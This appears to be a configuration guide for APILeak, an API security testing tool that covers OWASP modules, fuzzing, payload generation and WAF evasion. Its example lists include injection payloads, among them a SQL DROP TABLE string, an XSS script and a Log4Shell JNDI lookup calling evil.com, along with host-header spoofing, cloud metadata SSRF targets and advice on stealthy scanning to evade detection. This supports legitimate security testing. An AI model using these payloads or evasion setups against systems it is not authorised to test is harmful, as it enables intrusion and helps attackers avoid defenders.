# Configuration Guide

This guide covers all configuration options for APILeak, from basic setup to advanced OWASP module configuration.

## 📋 Table of Contents

- [Configuration Overview](#configuration-overview)
- [Basic Configuration](#basic-configuration)
- [Target Configuration](#target-configuration)
- [Authentication Setup](#authentication-setup)
- [OWASP Module Configuration](#owasp-module-configuration)
- [Fuzzing Configuration](#fuzzing-configuration)
- [Payload Generator Configuration](#payload-generator-configuration)
- [WAF Evasion Configuration](#waf-evasion-configuration)
- [Rate Limiting](#rate-limiting)
- [Reporting Configuration](#reporting-configuration)
- [Advanced Options](#advanced-options)
- [Environment Variables](#environment-variables)
- [Configuration Examples](#configuration-examples)

## 🎯 Configuration Overview

APILeak uses YAML configuration files with Pydantic validation for type safety and comprehensive error checking. The configuration system supports:

- **Hierarchical Structure**: Organized sections for different components
- **Type Validation**: Automatic validation of all configuration values
- **Environment Variables**: Override configuration with environment variables
- **CLI Overrides**: Command-line arguments override configuration values
- **Multiple Formats**: YAML (recommended) and JSON support

### Configuration File Structure

```yaml
# Target API configuration
target:
  base_url: "https://api.example.com"
  # ... target options

# Authentication contexts
authentication:
  contexts: []
  # ... auth options

# OWASP testing modules
owasp_testing:
  enabled_modules: []
  # ... OWASP module configs

# Fuzzing configuration
fuzzing:
  endpoints: {}
  # ... fuzzing options

# Payload generation and obfuscation
payload_generation:
  enabled: true
  # ... payload options

# Rate limiting and performance
rate_limiting:
  requests_per_second: 10
  # ... rate limiting options

# Report generation
reporting:
  formats: ["json", "html"]
  # ... reporting options
```

## 🎯 Basic Configuration

### Minimal Configuration

The simplest configuration requires only a target URL:

```yaml
target:
  base_url: "https://api.example.com"
```

### Recommended Basic Configuration

```yaml
# Target API
target:
  base_url: "https://api.example.com"
  timeout: 10
  verify_ssl: true

# Rate limiting (be respectful)
rate_limiting:
  requests_per_second: 5
  adaptive: true

# Enable core OWASP modules
owasp_testing:
  enabled_modules: ["bola", "auth", "property"]

# Generate reports
reporting:
  formats: ["json", "html"]
  output_dir: "reports"
```

## 🎯 Target Configuration

Configure the target API and connection settings:

```yaml
target:
  # Required: Base URL of the target API
  base_url: "https://api.example.com"
  
  # Optional: API version (appended to base_url)
  api_version: "v1"  # Results in https://api.example.com/v1
  
  # Optional: Default HTTP method for requests
  default_method: "GET"
  
  # Optional: Request timeout in seconds
  timeout: 10
  
  # Optional: SSL certificate verification
  verify_ssl: true
  
  # Optional: Custom headers for all requests
  headers:
    User-Agent: "APILeak/0.1.0"
    Accept: "application/json"
```

### SSL Configuration

```yaml
target:
  base_url: "https://api.example.com"
  
  # Disable SSL verification (not recommended for production)
  verify_ssl: false
  
  # Or specify custom CA bundle
  verify_ssl: "/path/to/ca-bundle.crt"
```

## 🔐 Authentication Setup

Configure multiple authentication contexts for testing different privilege levels:

### Basic Authentication Contexts

```yaml
authentication:
  contexts:
    # Anonymous user (no authentication)
    - name: "anonymous"
      type: "bearer"
      token: ""
      privilege_level: 0
    
    # Regular user
    - name: "user"
      type: "bearer"
      token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
      privilege_level: 1
    
    # Administrator
    - name: "admin"
      type: "bearer"
      token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
      privilege_level: 3
  
  # Default context for requests
  default_context: "user"
```

### Authentication Types

#### Bearer Token Authentication

```yaml
authentication:
  contexts:
    - name: "api_user"
      type: "bearer"
      token: "sk_test_1234567890abcdef"
      privilege_level: 1
```

#### Basic Authentication

```yaml
authentication:
  contexts:
    - name: "basic_user"
      type: "basic"
      username: "testuser"
      password: "testpass123"
      privilege_level: 1
```

#### API Key Authentication

```yaml
authentication:
  contexts:
    - name: "api_key_user"
      type: "api_key"
      token: "abc123def456"
      headers:
        X-API-Key: "abc123def456"
      privilege_level: 1
```

#### JWT Authentication

```yaml
authentication:
  contexts:
    - name: "jwt_user"
      type: "jwt"
      token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
      privilege_level: 1
```

#### Custom Headers

```yaml
authentication:
  contexts:
    - name: "custom_auth"
      type: "bearer"
      token: "custom_token_123"
      headers:
        X-Custom-Auth: "custom_value"
        X-User-Role: "admin"
      privilege_level: 2
```

## 🛡️ OWASP Module Configuration

Configure OWASP API Security Top 10 testing modules:

### Enable/Disable Modules

```yaml
owasp_testing:
  # Specify which modules to run
  enabled_modules: ["bola", "auth", "property", "resource", "function_auth", "ssrf"]
  
  # Or enable all available modules
  enabled_modules: ["all"]
  
  # Or disable specific modules
  enabled_modules: ["all"]
  disabled_modules: ["resource", "ssrf"]  # Not implemented yet
```

### API1 - Broken Object Level Authorization (BOLA)

```yaml
owasp_testing:
  bola_testing:
    enabled: true
    
    # ID patterns to test
    id_patterns: ["sequential", "guid", "uuid", "short_uuid", "base64_id"]
    
    # Authentication contexts to test with
    test_contexts: ["anonymous", "user", "admin"]
    
    # Number of IDs to enumerate around discovered IDs
    enumeration_range: 10
    
    # Maximum number of objects to test per endpoint
    max_objects_per_endpoint: 100
```

### API2 - Broken Authentication

```yaml
owasp_testing:
  auth_testing:
    enabled: true
    
    # Enable JWT vulnerability testing
    jwt_testing: true
    
    # Wordlist for testing weak JWT secrets
    weak_secrets_wordlist: "wordlists/jwt_secrets.txt"
    
    # Test token invalidation after logout
    test_logout_invalidation: true
    
    # Test token expiration validation
    test_token_expiration: true
    
    # Algorithms to flag as weak
    weak_algorithms: ["none", "HS256"]
```

### API3 - Broken Object Property Level Authorization

```yaml
owasp_testing:
  property_testing:
    enabled: true
    
    # Sensitive field patterns to detect
    sensitive_fields:
      - "password"
      - "api_key"
      - "secret"
      - "token"
      - "ssn"
      - "credit_card"
      - "phone"
      - "email"
    
    # Dangerous fields for mass assignment testing
    mass_assignment_fields:
      - "is_admin"
      - "role"
      - "permissions"
      - "user_id"
      - "account_id"
      - "balance"
      - "credit"
    
    # Test read-only field modification
    test_readonly_fields: true
    
    # Detect undocumented fields
    detect_undocumented_fields: true
```

### API4 - Unrestricted Resource Consumption

```yaml
owasp_testing:
  resource_testing:
    enabled: true
    
    # Burst testing (rapid requests)
    burst_size: 100
    burst_delay: 0.01  # seconds between requests
    
    # Large payload testing
    large_payload_sizes:
      - 1048576    # 1 MB
      - 10485760   # 10 MB
      - 104857600  # 100 MB
    
    # JSON depth testing
    json_depth_limit: 1000
    
    # Array size testing
    large_array_sizes: [1000, 10000, 100000]
    
    # ReDoS pattern testing
    redos_patterns:
      - "^(a+)+$"
      - "^(a|a)*$"
      - "^([a-zA-Z]+)*$"
```

### API5 - Broken Function Level Authorization

```yaml
owasp_testing:
  function_auth_testing:
    enabled: true
    
    # Admin endpoint patterns
    admin_endpoints:
      - "/admin"
      - "/api/admin"
      - "/management"
      - "/dashboard"
      - "/config"
    
    # HTTP methods that require special authorization
    dangerous_methods: ["DELETE", "PUT", "PATCH"]
    
    # Test parameter-based bypass
    test_parameter_bypass: true
    bypass_parameters:
      - "admin=true"
      - "role=admin"
      - "is_admin=1"
    
    # Test header-based bypass
    test_header_bypass: true
    bypass_headers:
      - "X-Admin: true"
      - "X-Role: admin"
      - "X-Privilege: admin"
```

### API7 - Server Side Request Forgery (SSRF)

```yaml
owasp_testing:
  ssrf_testing:
    enabled: true
    
    # Internal network targets
    internal_targets:
      - "127.0.0.1"
      - "localhost"
      - "0.0.0.0"
      - "169.254.169.254"  # AWS metadata
      - "metadata.google.internal"  # GCP metadata
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
    
    # File protocol testing
    file_protocols: ["file://", "ftp://", "gopher://"]
    
    # Common internal services
    internal_services:
      - "http://localhost:22"    # SSH
      - "http://localhost:3306"  # MySQL
      - "http://localhost:5432"  # PostgreSQL
      - "http://localhost:6379"  # Redis
    
    # Timeout for SSRF requests
    ssrf_timeout: 5
    
    # Test blind SSRF
    test_blind_ssrf: true
```

## 🎯 Fuzzing Configuration

Configure traditional fuzzing capabilities:

### Endpoint Fuzzing

```yaml
fuzzing:
  endpoints:
    enabled: true
    
    # Wordlist for endpoint discovery
    wordlist: "wordlists/endpoints.txt"
    
    # HTTP methods to test
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
    
    # Follow HTTP redirects
    follow_redirects: true
    
    # Maximum redirect depth
    max_redirects: 5
    
    # Custom endpoint patterns
    custom_patterns:
      - "/api/{version}/users"
      - "/v{version}/accounts"
      - "/{resource}/search"
```

### Parameter Fuzzing

```yaml
fuzzing:
  parameters:
    enabled: true
    
    # Query parameter wordlist
    query_wordlist: "wordlists/parameters.txt"
    
    # Body parameter wordlist
    body_wordlist: "wordlists/parameters.txt"
    
    # Enable boundary value testing
    boundary_testing: true
    
    # Boundary test values
    boundary_values:
      integers: [-1, 0, 1, 999999, -999999]
      strings: ["", "a", "A" * 1000, "null", "undefined"]
      booleans: [true, false, "true", "false", 1, 0]
    
    # Parameter injection patterns
    injection_patterns:
      - "'; DROP TABLE users; --"
      - "<script>alert('xss')</script>"
      - "{{7*7}}"
      - "${jndi:ldap://evil.com/a}"
```

### Header Fuzzing

```yaml
fuzzing:
  headers:
    enabled: true
    
    # Header wordlist
    wordlist: "wordlists/headers.txt"
    
    # Custom headers to test
    custom_headers:
      X-Forwarded-For: "127.0.0.1"
      X-Real-IP: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"
      X-Remote-IP: "127.0.0.1"
      X-Client-IP: "127.0.0.1"
    
    # WAF Evasion - User Agent Configuration
    random_user_agent: false          # Use random user agents from built-in list
    user_agent_list: []               # Custom list of user agents for rotation
    user_agent_rotation: false        # Enable user agent rotation
    
    # Header injection patterns
    injection_headers:
      - "X-Forwarded-Host: evil.com"
      - "Host: evil.com"
      - "X-Forwarded-Proto: javascript"
```

### WAF Evasion Configuration

```yaml
fuzzing:
  headers:
    # Built-in random user agent rotation
    random_user_agent: true
    
    # OR use custom user agent list with rotation
    user_agent_rotation: true
    user_agent_list:
      - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      - "curl/8.4.0"
      - "Postman/10.20.0"
    
    # OR use single custom user agent
    custom_headers:
      User-Agent: "MyCustomSecurityScanner/1.0"
```

### Recursive Fuzzing

```yaml
fuzzing:
  # Enable recursive endpoint discovery
  recursive: true
  
  # Maximum recursion depth
  max_depth: 3
  
  # Minimum response size to consider valid
  min_response_size: 10
  
  # Status codes that indicate valid endpoints
  valid_status_codes: [200, 201, 202, 301, 302, 401, 403]
```

## 🎯 Payload Generator Configuration

Configure advanced payload generation, encoding, and obfuscation for comprehensive security testing:

### Basic Payload Generation

```yaml
payload_generation:
  # Enable/disable payload generation
  enabled: true
  
  # Include original payload in results
  include_original: true
  
  # Maximum variations per payload
  max_variations_per_payload: 10
```

### Encoding Configuration

```yaml
payload_generation:
  encodings:
    enabled: true
    
    # Supported encoding types
    types:
      - "url"           # URL encoding (%20, %27, etc.)
      - "base64"        # Base64 encoding
      - "html"          # HTML entity encoding (&lt;, &gt;, etc.)
      - "unicode"       # Unicode encoding (\u0027, etc.)
      - "double_url"    # Double URL encoding
      - "hex"           # Hexadecimal encoding
    
    # Maximum encoded variations per payload
    max_variations: 10
    
    # Include original payload in encoded results
    include_original: true
```

### Obfuscation Configuration

```yaml
payload_generation:
  obfuscation:
    enabled: true
    
    # Obfuscation techniques
    techniques:
      - "case_variation"      # Upper/lower/mixed case
      - "mutation"            # Character substitutions
      - "whitespace_insertion" # Insert whitespace characters
      - "comment_insertion"   # Insert SQL/code comments
      - "concatenation"       # String concatenation techniques
    
    # Maximum obfuscated variations per payload
    max_variations: 8
```

### Vulnerability-Specific Payloads

```yaml
payload_generation:
  vulnerability_payloads:
    enabled: true
    
    # SQL Injection payloads
    sql_injection:
      enabled: true
      include_time_based: true      # Time-based blind SQL injection
      include_error_based: true     # Error-based SQL injection
      include_union_based: true     # UNION-based SQL injection
      include_boolean_based: true   # Boolean-based blind SQL injection
    
    # XSS payloads
    xss:
      enabled: true
      include_reflected: true       # Reflected XSS
      include_stored: true          # Stored XSS
      include_dom_based: true       # DOM-based XSS
      include_filter_evasion: true  # Filter evasion techniques
    
    # Command Injection payloads
    command_injection:
      enabled: true
      include_linux_commands: true  # Linux/Unix commands
      include_windows_commands: true # Windows commands
      include_time_based: true      # Time-based detection
    
    # Path Traversal payloads
    path_traversal:
      enabled: true
      include_linux_paths: true     # Linux/Unix paths
      include_windows_paths: true   # Windows paths
      include_encoded_variants: true # Encoded path traversal
    
    # Server-Side Template Injection
    ssti:
      enabled: true
      include_jinja2: true          # Jinja2 templates
      include_django: true          # Django templates
      include_flask: true           # Flask templates
      include_twig: true            # Twig templates
    
    # NoSQL Injection payloads
    nosql_injection:
      enabled: true
      include_mongodb: true         # MongoDB injection
      include_javascript: true      # JavaScript injection
```

### Framework-Specific Adaptation

```yaml
payload_generation:
  framework_adaptation:
    enabled: true
    
    # Automatically adapt payloads based on detected framework
    auto_adapt: true
    
    # Framework-specific configurations
    frameworks:
      fastapi:
        enabled: true
        focus_vulnerabilities: ["sql_injection", "xss", "command_injection"]
      
      django:
        enabled: true
        focus_vulnerabilities: ["sql_injection", "ssti", "path_traversal"]
      
      express:
        enabled: true
        focus_vulnerabilities: ["xss", "command_injection", "path_traversal"]
      
      flask:
        enabled: true
        focus_vulnerabilities: ["ssti", "xss", "sql_injection"]
```

### Wordlist Expansion

```yaml
payload_generation:
  wordlist_expansion:
    enabled: true
    
    # Common prefixes for API endpoints
    prefixes:
      - "v1/"
      - "v2/"
      - "v3/"
      - "api/"
      - "api/v1/"
      - "api/v2/"
      - "admin/"
      - "internal/"
      - "private/"
      - "test/"
      - "dev/"
      - "staging/"
    
    # Common suffixes for API endpoints
    suffixes:
      - "/list"
      - "/create"
      - "/read"
      - "/update"
      - "/delete"
      - "/search"
      - "/filter"
      - "/export"
      - "/import"
      - "/backup"
      - "/restore"
      - "/admin"
      - "/config"
      - "/settings"
      - "/status"
      - "/health"
    
    # Maximum expanded wordlist size
    max_size: 10000
```

### Custom Templates

```yaml
payload_generation:
  custom_templates:
    enabled: true
    
    # Directory containing custom YAML templates
    templates_directory: "templates/payloads"
    
    # Load custom templates on startup
    auto_load: true
    
    # Validate templates on load
    validate_templates: true
```

### Performance Settings

```yaml
payload_generation:
  performance:
    # Maximum payload variations to generate per vulnerability type
    max_payloads_per_type: 100
    
    # Enable payload caching to improve performance
    enable_caching: true
    
    # Cache size (number of payload sets to cache)
    cache_size: 50
    
    # Parallel payload generation
    parallel_generation: true
    
    # Number of worker threads for payload generation
    worker_threads: 4
```

### WAF Evasion Integration

```yaml
payload_generation:
  waf_evasion:
    enabled: true
    
    # Automatically apply evasion techniques when WAF is detected
    auto_apply: true
    
    # Evasion techniques to use
    techniques:
      - "encoding_chains"      # Multiple encoding layers
      - "case_manipulation"    # Mixed case variations
      - "whitespace_variations" # Different whitespace characters
      - "comment_insertion"    # Insert comments to break patterns
      - "string_concatenation" # Break strings into parts
      - "unicode_normalization" # Unicode normalization attacks
    
    # WAF-specific evasion profiles
    profiles:
      cloudflare:
        enabled: true
        techniques: ["encoding_chains", "unicode_normalization"]
      
      aws_waf:
        enabled: true
        techniques: ["case_manipulation", "comment_insertion"]
      
      akamai:
        enabled: true
        techniques: ["whitespace_variations", "string_concatenation"]
```

### Integration with Other Modules

```yaml
payload_generation:
  integration:
    # Use payload generator in fuzzing modules
    fuzzing_integration:
      enabled: true
      
      # Apply payload generation to parameter fuzzing
      parameter_fuzzing: true
      
      # Apply payload generation to header fuzzing
      header_fuzzing: true
      
      # Apply payload generation to body fuzzing
      body_fuzzing: true
    
    # Use payload generator in OWASP modules
    owasp_integration:
      enabled: true
      
      # Generate payloads for BOLA testing
      bola_testing: true
      
      # Generate payloads for authentication testing
      auth_testing: true
      
      # Generate payloads for property-level authorization testing
      property_auth_testing: true
      
      # Generate payloads for function-level authorization testing
      function_auth_testing: true
```

### Logging and Debugging

```yaml
payload_generation:
  logging:
    # Log payload generation activities
    log_generation: false
    
    # Log payload encoding/obfuscation
    log_transformations: false
    
    # Log template loading
    log_template_loading: true
    
    # Log performance metrics
    log_performance: true
    
    # Debug mode (verbose logging)
    debug_mode: false
```

### Complete Payload Generator Example

```yaml
# Comprehensive payload generator configuration
payload_generation:
  enabled: true
  include_original: true
  max_variations_per_payload: 15
  
  encodings:
    enabled: true
    types: ["url", "base64", "html", "unicode", "double_url", "hex"]
    max_variations: 12
    include_original: true
  
  obfuscation:
    enabled: true
    techniques: ["case_variation", "mutation", "whitespace_insertion", "comment_insertion", "concatenation"]
    max_variations: 10
  
  vulnerability_payloads:
    enabled: true
    sql_injection:
      enabled: true
      include_time_based: true
      include_error_based: true
      include_union_based: true
      include_boolean_based: true
    xss:
      enabled: true
      include_reflected: true
      include_stored: true
      include_dom_based: true
      include_filter_evasion: true
    command_injection:
      enabled: true
      include_linux_commands: true
      include_windows_commands: true
      include_time_based: true
    path_traversal:
      enabled: true
      include_linux_paths: true
      include_windows_paths: true
      include_encoded_variants: true
    ssti:
      enabled: true
      include_jinja2: true
      include_django: true
      include_flask: true
    nosql_injection:
      enabled: true
      include_mongodb: true
      include_javascript: true
  
  framework_adaptation:
    enabled: true
    auto_adapt: true
    frameworks:
      fastapi:
        enabled: true
        focus_vulnerabilities: ["sql_injection", "xss", "command_injection"]
      django:
        enabled: true
        focus_vulnerabilities: ["sql_injection", "ssti", "path_traversal"]
      express:
        enabled: true
        focus_vulnerabilities: ["xss", "command_injection", "path_traversal"]
      flask:
        enabled: true
        focus_vulnerabilities: ["ssti", "xss", "sql_injection"]
  
  wordlist_expansion:
    enabled: true
    prefixes: ["v1/", "v2/", "api/", "admin/", "internal/", "test/", "dev/"]
    suffixes: ["/list", "/create", "/update", "/delete", "/search", "/admin", "/config"]
    max_size: 10000
  
  custom_templates:
    enabled: true
    templates_directory: "templates/payloads"
    auto_load: true
    validate_templates: true
  
  performance:
    max_payloads_per_type: 150
    enable_caching: true
    cache_size: 100
    parallel_generation: true
    worker_threads: 6
  
  waf_evasion:
    enabled: true
    auto_apply: true
    techniques: ["encoding_chains", "case_manipulation", "whitespace_variations", "comment_insertion"]
    profiles:
      cloudflare:
        enabled: true
        techniques: ["encoding_chains", "unicode_normalization"]
      aws_waf:
        enabled: true
        techniques: ["case_manipulation", "comment_insertion"]
  
  integration:
    fuzzing_integration:
      enabled: true
      parameter_fuzzing: true
      header_fuzzing: true
      body_fuzzing: true
    owasp_integration:
      enabled: true
      bola_testing: true
      auth_testing: true
      property_auth_testing: true
      function_auth_testing: true
  
  logging:
    log_generation: false
    log_transformations: false
    log_template_loading: true
    log_performance: true
    debug_mode: false
```

## 🥷 WAF Evasion Configuration

Configure Web Application Firewall evasion techniques to improve testing effectiveness:

### User Agent Strategies

APILeak supports multiple user agent strategies for bypassing WAF detection:

#### 1. Random User Agent Rotation (CLI)

```bash
# Use built-in random user agents
python apileaks.py dir --target https://api.example.com --user-agent-random
python apileaks.py par --target https://api.example.com --user-agent-random
python apileaks.py full --target https://api.example.com --user-agent-random
```

#### 2. Custom User Agent (CLI)

```bash
# Use a single custom user agent
python apileaks.py dir --target https://api.example.com --user-agent-custom "MyBot/1.0"
python apileaks.py par --target https://api.example.com --user-agent-custom "Security Scanner v2.0"
```

#### 3. User Agent File Rotation (CLI)

```bash
# Rotate through user agents from file
python apileaks.py dir --target https://api.example.com --user-agent-file wordlists/user_agents.txt
python apileaks.py full --target https://api.example.com --user-agent-file custom_agents.txt
```

### Configuration File Setup

#### Random User Agent Configuration

```yaml
fuzzing:
  headers:
    # Enable random user agent rotation
    random_user_agent: true
    
    # Built-in user agents include:
    # - Desktop browsers (Chrome, Firefox, Safari, Edge)
    # - Mobile browsers (iOS Safari, Android Chrome)
    # - Search engine crawlers (Googlebot, Bingbot)
    # - API tools (curl, Postman, HTTPie)
    # - Security tools (OWASP ZAP, Burp Suite)
```

#### Custom User Agent List Configuration

```yaml
fuzzing:
  headers:
    # Enable user agent rotation from custom list
    user_agent_rotation: true
    user_agent_list:
      # Desktop browsers
      - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      
      # Mobile browsers
      - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
      - "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
      
      # API tools
      - "curl/8.4.0"
      - "Postman/10.20.0"
      - "HTTPie/3.2.2"
      
      # Security tools
      - "Mozilla/5.0 (compatible; OWASP ZAP 2.14.0)"
      - "Burp/2023.10.3.4 Community"
```

#### Single Custom User Agent Configuration

```yaml
fuzzing:
  headers:
    # Use a single custom user agent
    custom_headers:
      User-Agent: "MyCustomSecurityScanner/1.0 (Enterprise Edition)"
      Accept: "application/json, application/xml"
```

### User Agent File Format

Create a text file with one user agent per line:

```
# wordlists/user_agents.txt
# Comments start with #

# Desktop browsers
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

# Mobile browsers
Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36

# API testing tools
curl/8.4.0
Postman/10.20.0
HTTPie/3.2.2
Insomnia/2023.8.0

# Search engine crawlers
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)

# Security tools
Mozilla/5.0 (compatible; OWASP ZAP 2.14.0)
Burp/2023.10.3.4 Community
```

### WAF Evasion Best Practices

#### 1. User Agent Selection Strategy

```yaml
# For general testing - use random rotation
fuzzing:
  headers:
    random_user_agent: true

# For specific applications - use targeted user agents
fuzzing:
  headers:
    user_agent_rotation: true
    user_agent_list:
      - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"  # Search engine
      - "curl/8.4.0"  # API tool
      - "Postman/10.20.0"  # Development tool

# For stealth testing - use legitimate browser agents
fuzzing:
  headers:
    user_agent_rotation: true
    user_agent_list:
      - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
```

#### 2. Rate Limiting with WAF Evasion

```yaml
# Combine user agent rotation with conservative rate limiting
rate_limiting:
  requests_per_second: 2  # Very conservative
  adaptive: true
  respect_retry_after: true
  jitter: true

fuzzing:
  headers:
    random_user_agent: true
```

#### 3. Complete WAF Evasion Configuration

```yaml
# Comprehensive WAF evasion setup
target:
  base_url: "https://api.example.com"
  timeout: 30  # Longer timeout for WAF processing

fuzzing:
  headers:
    # Enable user agent rotation
    random_user_agent: true
    
    # Additional evasion headers
    custom_headers:
      X-Forwarded-For: "127.0.0.1"
      X-Real-IP: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"
      Accept: "application/json, text/html, */*"
      Accept-Language: "en-US,en;q=0.9"
      Accept-Encoding: "gzip, deflate"
      Cache-Control: "no-cache"

rate_limiting:
  requests_per_second: 1  # Very slow to avoid detection
  adaptive: true
  respect_retry_after: true
  jitter: true
  jitter_factor: 0.2  # 20% random variation

# Conservative OWASP testing
owasp_testing:
  enabled_modules: ["bola", "auth"]  # Start with less aggressive modules
  
  bola_testing:
    enumeration_range: 5  # Smaller range
    max_objects_per_endpoint: 50

reporting:
  formats: ["json"]
  output_filename: "stealth_scan"
```

### CLI Examples with WAF Evasion

```bash
# Stealth directory fuzzing
python apileaks.py dir \
  --target https://api.example.com \
  --wordlist wordlists/endpoints.txt \
  --user-agent-random \
  --rate-limit 1 \
  --output stealth_dir_scan

# Parameter fuzzing with custom user agent
python apileaks.py par \
  --target https://api.example.com/users \
  --wordlist wordlists/parameters.txt \
  --user-agent-custom "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
  --rate-limit 2 \
  --output googlebot_param_scan

# Full scan with user agent file rotation
python apileaks.py full \
  --target https://api.example.com \
  --user-agent-file wordlists/stealth_agents.txt \
  --rate-limit 1 \
  --modules bola,auth \
  --output comprehensive_stealth_scan
```

## ⚡ Rate Limiting

Configure rate limiting to avoid overwhelming target APIs:

### Basic Rate Limiting

```yaml
rate_limiting:
  # Requests per second
  requests_per_second: 10
  
  # Burst size (requests that can be sent immediately)
  burst_size: 20
  
  # Enable adaptive rate limiting
  adaptive: true
  
  # Respect Retry-After headers
  respect_retry_after: true
  
  # Backoff factor for rate limit detection
  backoff_factor: 2.0
  
  # Maximum backoff time in seconds
  max_backoff: 60.0
```

### Advanced Rate Limiting

```yaml
rate_limiting:
  # Different rates for different request types
  per_endpoint_limits:
    "/api/login": 1      # 1 request per second for login
    "/api/search": 5     # 5 requests per second for search
    "/api/users": 10     # 10 requests per second for users
  
  # Rate limiting based on response codes
  status_code_limits:
    429: 0.1  # Very slow when hitting rate limits
    503: 0.5  # Slow when service unavailable
    500: 1.0  # Moderate when server errors
  
  # Jitter to avoid thundering herd
  jitter: true
  jitter_factor: 0.1  # 10% random variation
```

## 📊 Reporting Configuration

Configure report generation and output formats:

### Basic Reporting

```yaml
reporting:
  # Output formats
  formats: ["json", "html", "txt", "xml"]
  
  # Output directory
  output_dir: "reports"
  
  # Custom output filename (without extension)
  output_filename: "security_scan_results"  # Results in security_scan_results.json, etc.
  
  # Include timestamps in filenames (when output_filename not specified)
  include_timestamp: true
  
  # Report filename template (when output_filename not specified)
  filename_template: "apileak_report_{timestamp}"
```

### Advanced Reporting

```yaml
reporting:
  # Detailed format configuration
  formats:
    - format: "json"
      pretty: true
      include_raw_responses: false
    
    - format: "html"
      template: "custom_template.html"
      include_charts: true
      include_timeline: true
    
    - format: "xml"
      schema: "nessus"  # Compatible with Nessus
    
    - format: "csv"
      fields: ["severity", "category", "endpoint", "evidence"]
  
  # Report content options
  include_statistics: true
  include_owasp_coverage: true
  include_recommendations: true
  include_raw_requests: false
  include_raw_responses: false
  
  # Filtering options
  min_severity: "LOW"  # Only include findings of LOW severity or higher
  exclude_categories: ["ENDPOINT_DISCOVERED", "FRAMEWORK_DETECTED"]
  
  # Report delivery
  email:
    enabled: false
    smtp_server: "smtp.company.com"
    recipients: ["security@company.com"]
  
  webhook:
    enabled: false
    url: "https://hooks.slack.com/services/..."
    on_critical: true
```

## 🔧 Advanced Options

### Logging Configuration

```yaml
logging:
  # Log level
  level: "INFO"  # DEBUG, INFO, WARNING, ERROR
  
  # Log format
  format: "structured"  # structured, json, simple
  
  # Log file
  file: "apileak.log"
  
  # Log rotation
  rotate: true
  max_size: "10MB"
  backup_count: 5
  
  # Module-specific log levels
  modules:
    "core.engine": "DEBUG"
    "modules.owasp": "INFO"
    "utils.http_client": "WARNING"
```

### Performance Tuning

```yaml
performance:
  # HTTP client settings
  http:
    connection_pool_size: 100
    connection_timeout: 10
    read_timeout: 30
    max_redirects: 5
  
  # Async settings
  async:
    max_concurrent_requests: 50
    semaphore_limit: 25
  
  # Memory management
  memory:
    max_response_size: "10MB"
    cache_size: 1000
    gc_threshold: 10000
```

### Proxy Configuration

```yaml
proxy:
  # HTTP proxy
  http_proxy: "http://proxy.company.com:8080"
  
  # HTTPS proxy
  https_proxy: "http://proxy.company.com:8080"
  
  # Proxy authentication
  proxy_auth:
    username: "proxyuser"
    password: "proxypass"
  
  # No proxy for these hosts
  no_proxy: ["localhost", "127.0.0.1", "*.internal.com"]
```

## 🌍 Environment Variables

Override configuration values with environment variables:

### Common Environment Variables

```bash
# Target configuration
export APILEAK_TARGET_URL="https://api.example.com"
export APILEAK_TARGET_TIMEOUT="30"

# Authentication
export APILEAK_AUTH_TOKEN="eyJ0eXAiOiJKV1Q..."
export APILEAK_AUTH_TYPE="bearer"

# Rate limiting
export APILEAK_RATE_LIMIT="5"
export APILEAK_BURST_SIZE="10"

# Output
export APILEAK_OUTPUT_DIR="/tmp/reports"
export APILEAK_LOG_LEVEL="DEBUG"

# Proxy
export HTTP_PROXY="http://proxy.company.com:8080"
export HTTPS_PROXY="http://proxy.company.com:8080"
```

### Environment Variable Naming

Environment variables follow the pattern: `APILEAK_<SECTION>_<OPTION>`

```yaml
# Configuration file:
target:
  base_url: "https://api.example.com"
  timeout: 10

# Environment variable:
APILEAK_TARGET_BASE_URL="https://api.example.com"
APILEAK_TARGET_TIMEOUT="10"
```

## 📝 Configuration Examples

### Development Environment

```yaml
